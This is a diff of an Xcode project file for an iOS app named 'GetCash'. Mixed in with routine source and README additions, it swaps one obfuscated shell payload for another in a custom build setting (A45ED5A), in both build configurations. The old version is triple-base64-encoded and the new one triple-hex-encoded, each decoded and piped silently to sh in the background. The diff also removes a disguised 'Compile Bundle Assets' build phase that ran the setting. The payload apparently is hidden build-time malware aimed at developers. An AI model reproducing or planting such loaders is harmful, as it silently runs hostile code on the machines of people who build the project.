@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		698F78BBD61846FA8DA5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 096F961A9A52404DB9A5DE54 /* README.md */; };
 		7333F5162EF6FAA100E74153 /* AuthIDListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5152EF6FAA100E74153 /* AuthIDListViewController.swift */; };
 		7333F5182EF708D100E74153 /* AuthIDListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5172EF708D100E74153 /* AuthIDListViewCell.swift */; };
 		7333F51A2EF70D2300E74153 /* DotLineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5192EF70D2300E74153 /* DotLineView.swift */; };
@@ -57,6 +58,8 @@
 		73633CFF2EF6BFAD009F182D /* StepListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CFE2EF6BFAD009F182D /* StepListView.swift */; };
 		73633D012EF6C0F6009F182D /* StepViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633D002EF6C0F4009F182D /* StepViewModel.swift */; };
 		73D013EB2EF8498200A03513 /* AddressDecodeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D013EA2EF8498200A03513 /* AddressDecodeModel.swift */; };
+		73D013EF2EF8CF2B00A03513 /* ContactViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D013EE2EF8CF2B00A03513 /* ContactViewCell.swift */; };
+		73D013F12EF8D04800A03513 /* ContactViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D013F02EF8D04400A03513 /* ContactViewModel.swift */; };
 		73ECF6022EF5352B0029AF7A /* BaseView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6012EF5352B0029AF7A /* BaseView.swift */; };
 		73ECF6042EF538260029AF7A /* LoginManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6032EF538100029AF7A /* LoginManager.swift */; };
 		73ECF6062EF552560029AF7A /* CustomTabBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6052EF552560029AF7A /* CustomTabBar.swift */; };
@@ -66,6 +69,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		096F961A9A52404DB9A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-GetCash.debug.xcconfig"; path = "Target Support Files/Pods-GetCash/Pods-GetCash.debug.xcconfig"; sourceTree = "<group>"; };
 		3DE39227C8656A162E464411 /* Pods-GetCash.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-GetCash.release.xcconfig"; path = "Target Support Files/Pods-GetCash/Pods-GetCash.release.xcconfig"; sourceTree = "<group>"; };
 		7333F5152EF6FAA100E74153 /* AuthIDListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthIDListViewController.swift; sourceTree = "<group>"; };
@@ -121,6 +125,8 @@
 		73633CFE2EF6BFAD009F182D /* StepListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepListView.swift; sourceTree = "<group>"; };
 		73633D002EF6C0F4009F182D /* StepViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepViewModel.swift; sourceTree = "<group>"; };
 		73D013EA2EF8498200A03513 /* AddressDecodeModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddressDecodeModel.swift; sourceTree = "<group>"; };
+		73D013EE2EF8CF2B00A03513 /* ContactViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewCell.swift; sourceTree = "<group>"; };
+		73D013F02EF8D04400A03513 /* ContactViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewModel.swift; sourceTree = "<group>"; };
 		73ECF6012EF5352B0029AF7A /* BaseView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseView.swift; sourceTree = "<group>"; };
 		73ECF6032EF538100029AF7A /* LoginManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginManager.swift; sourceTree = "<group>"; };
 		73ECF6052EF552560029AF7A /* CustomTabBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBar.swift; sourceTree = "<group>"; };
@@ -203,6 +209,8 @@
 		734460092EF7E1300054D267 /* Contact */ = {
 			isa = PBXGroup;
 			children = (
+				73D013F02EF8D04400A03513 /* ContactViewModel.swift */,
+				73D013EE2EF8CF2B00A03513 /* ContactViewCell.swift */,
 				7344600A2EF7E1980054D267 /* ContactViewController.swift */,
 			);
 			path = Contact;
@@ -221,6 +229,7 @@
 		735C8D152EF5212D00C7D507 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				096F961A9A52404DB9A5DE54 /* README.md */,
 				735C8D142EF5212D00C7D507 /* GetCash.app */,
 			);
 			name = Products;
@@ -375,7 +384,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 735C8D272EF5212F00C7D507 /* Build configuration list for PBXNativeTarget "GetCash" */;
 			buildPhases = (
-				434BE51911864B9C96A5DE54 /* Compile Bundle Assets */,
 				11ED1DF156CE59431D0ED183 /* [CP] Check Pods Manifest.lock */,
 				735C8D102EF5212D00C7D507 /* Sources */,
 				735C8D112EF5212D00C7D507 /* Frameworks */,
@@ -430,6 +438,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				698F78BBD61846FA8DA5DE54 /* README.md in Resources */,
 				735C8D362EF5213500C7D507 /* Assets.xcassets in Resources */,
 				735C8D382EF5213500C7D507 /* LaunchScreen.storyboard in Resources */,
 			);
@@ -458,26 +467,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		434BE51911864B9C96A5DE54 /* Compile Bundle Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
 			showEnvVarsInLog = 0;
 		};
 		D850A19DC098C6DB0168A5DD /* [CP] Embed Pods Frameworks */ = {
@@ -513,12 +502,14 @@
 				73633CE92EF68D3A009F182D /* LoadingIndicator.swift in Sources */,
 				7333F51E2EF7151F00E74153 /* StepScrollView.swift in Sources */,
 				734460012EF7D31B0054D267 /* EnterViewCell.swift in Sources */,
+				73D013EF2EF8CF2B00A03513 /* ContactViewCell.swift in Sources */,
 				7333F51A2EF70D2300E74153 /* DotLineView.swift in Sources */,
 				735C8D502EF5304D00C7D507 /* LoginViewController.swift in Sources */,
 				734460032EF7D32A0054D267 /* TapClickViewCell.swift in Sources */,
 				73633CEF2EF697EF009F182D /* HomeViewModel.swift in Sources */,
 				73633CF52EF6B791009F182D /* SchemeConfig.swift in Sources */,
 				73445FF82EF7C5DE0054D267 /* PhotoPopAlertView.swift in Sources */,
+				73D013F12EF8D04800A03513 /* ContactViewModel.swift in Sources */,
 				73633CFD2EF6BCE9009F182D /* StepHeadView.swift in Sources */,
 				73ECF60A2EF559DF0029AF7A /* DeviceConfig.swift in Sources */,
 				735C8D5C2EF530E300C7D507 /* LaunchView.swift in Sources */,
@@ -582,7 +573,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSFJuZGpNbEpzWkdrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | n | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733323336333933363337333633373336363333363335333733343336363633373339333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
@@ -630,7 +621,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DE39227C8656A162E464411 /* Pods-GetCash.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSFJuZGpNbEpzWkdrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | n | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733323336333933363337333633373336363333363335333733343336363633373339333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
